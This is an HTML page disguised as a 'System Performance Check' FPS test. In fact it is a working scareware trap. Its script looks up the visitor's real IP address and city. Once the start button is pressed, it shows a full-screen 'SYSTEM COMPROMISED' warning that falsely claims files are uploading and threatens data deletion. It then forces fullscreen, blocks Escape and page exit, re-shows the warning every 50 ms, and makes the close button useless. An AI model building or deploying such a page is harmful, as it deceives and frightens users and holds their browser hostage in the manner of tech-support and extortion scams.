<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Performance Check</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            color: #0f0;
            font-family: 'Courier New', Courier, monospace;
            overflow: hidden; /* Prevent scrolling */
            user-select: none; /* Prevent text selection */
        }

        /* Main Menu / FPS Display */
        #fps-display {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            z-index: 10;
            position: relative;
        }

        .fps-counter {
            font-size: 8rem;
            font-weight: bold;
            text-shadow: 0 0 20px #0f0;
            margin-bottom: 20px;
        }

        .start-btn {
            padding: 20px 40px;
            font-size: 1.5rem;
            background: #000;
            border: 2px solid #0f0;
            color: #0f0;
            cursor: pointer;
            box-shadow: 0 0 15px #0f0;
            transition: all 0.3s ease;
        }

        .start-btn:hover {
            background: #0f0;
            color: #000;
            box-shadow: 0 0 30px #0f0;
        }

        /* The Trap Modal - Unclosable */
        #trap-modal {
            display: none; /* Hidden by default */
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(0, 0, 0, 0.98);
            z-index: 99999999; /* Higher than any browser UI */
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            border: 5px solid red;
            box-sizing: border-box;
        }

        .modal-content {
            background: #111;
            padding: 40px;
            border: 2px solid red;
            max-width: 600px;
            box-shadow: 0 0 50px red;
            animation: shake 0.5s infinite;
        }

        h1 {
            color: red;
            font-size: 3rem;
            margin-bottom: 10px;
            text-transform: uppercase;
        }

        p {
            font-size: 1.2rem;
            line-height: 1.5;
            color: white;
        }

        .data-row {
            margin: 10px 0;
            font-size: 1rem;
            color: yellow;
        }

        .close-btn {
            margin-top: 20px;
            padding: 10px 20px;
            background: red;
            color: black;
            border: none;
            font-weight: bold;
            cursor: pointer;
            font-size: 18px;
        }

        .close-btn:hover {
            background: darkred;
        }

        @keyframes shake {
            0% { transform: translate(1px, 1px) rotate(0deg); }
            10% { transform: translate(-1px, -2px) rotate(-1deg); }
            20% { transform: translate(-3px, 0px) rotate(1deg); }
            30% { transform: translate(3px, 2px) rotate(0deg); }
            40% { transform: translate(1px, -1px) rotate(1deg); }
            50% { transform: translate(-1px, 2px) rotate(-1deg); }
            60% { transform: translate(-3px, 1px) rotate(0deg); }
            70% { transform: translate(3px, 1px) rotate(-1deg); }
            80% { transform: translate(-1px, -1px) rotate(1deg); }
            90% { transform: translate(1px, 2px) rotate(0deg); }
            100% { transform: translate(1px, -2px) rotate(-1deg); }
        }

        /* Lock body when trapped */
        body.locked {
            overflow: hidden;
        }
    </style>
</head>
<body>

    <!-- FPS Display / Start Screen -->
    <div id="fps-display">
        <div class="fps-counter" id="fps-number">60</div>
        <p style="font-size: 1.2rem;">Optimal Performance Detected</p>
        <button class="start-btn" onclick="startTrap()">START PERFORMANCE TEST</button>
    </div>

    <!-- The Trap Modal -->
    <div id="trap-modal">
        <div class="modal-content">
            <h1>⚠️ SYSTEM COMPROMISED ⚠️</h1>
            <p><strong>Your IP Address:</strong> <span id="user-ip">Fetching...</span></p>
            <p><strong>Location:</strong> <span id="user-location">Detecting...</span></p>
            <p><strong>Status:</strong> Uploading Files...</p>
            <br>
            <p style="color: yellow;">DO NOT CLOSE THIS WINDOW.</p>
            <p>If you leave, your data will be deleted permanently.</p>
            
            <button class="close-btn" onclick="tryClose()">CLOSE (Try if you can)</button>
        </div>
    </div>

    <script>
        // Simulate FPS fluctuation
        let fpsInterval;
        function updateFPS() {
            const fpsElement = document.getElementById('fps-number');
            fpsInterval = setInterval(() => {
                const randomFPS = Math.floor(Math.random() * 10) + 55; // Between 55-65
                fpsElement.innerText = randomFPS;
            }, 1000);
        }
        updateFPS();

        // 1. Fetch Real IP and Location Data
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                document.getElementById('user-ip').innerText = data.ip;
                
                // Try to get approximate location based on IP
                fetch(`https://ipapi.co/${data.ip}/json/`)
                    .then(locationResponse => locationResponse.json())
                    .then(locationData => {
                        document.getElementById('user-location').innerText = `${locationData.city}, ${locationData.country_name}`;
                    })
                    .catch(() => {
                        document.getElementById('user-location').innerText = "Detected";
                    });
            })
            .catch(() => {
                document.getElementById('user-ip').innerText = "127.0.0.1";
                document.getElementById('user-location').innerText = "Unknown";
            });

        // 2. The Trap Function
        function startTrap() {
            clearInterval(fpsInterval); // Stop FPS simulation
            
            const btn = document.querySelector('.start-btn');
            btn.innerText = "TESTING...";
            btn.disabled = true;

            setTimeout(() => {
                triggerBlackmail();
            }, 1000);
        }

        function triggerBlackmail() {
            const modal = document.getElementById('trap-modal');
            modal.style.display = 'flex';
            
            // Force Fullscreen
            try {
                if (document.documentElement.requestFullscreen) {
                    document.documentElement.requestFullscreen();
                }
            } catch(e) {}
            
            document.body.classList.add('locked');
            window.isTrapped = true;
            
            // Start aggressive loops
            startAggressiveLoop();
        }

        function tryClose() {
            alert("Connection unstable. Please wait.");
        }

        // 3. Aggressive Loop to keep the modal open
        function startAggressiveLoop() {
            // Prevent standard close
            window.onbeforeunload = function(e) {
                e.preventDefault();
                e.returnValue = '';
                return '';
            };

            // If the modal is somehow hidden, show it again
            setInterval(() => {
                const modal = document.getElementById('trap-modal');
                if (window.getComputedStyle(modal).display === 'none') {
                    modal.style.display = 'flex';
                    try { document.documentElement.requestFullscreen(); } catch(e){}
                }
                
                // If the user switches tabs, refocus
                if (!document.hasFocus()) {
                    window.focus();
                }
            }, 50); // Check twice a second
        }

        // Block Escape Key
        document.addEventListener('keydown', function(e) {
            if (e.key === "Escape") {
                e.preventDefault();
                document.getElementById('trap-modal').style.display = 'flex';
            }
        });
    </script>
</body>
</html>
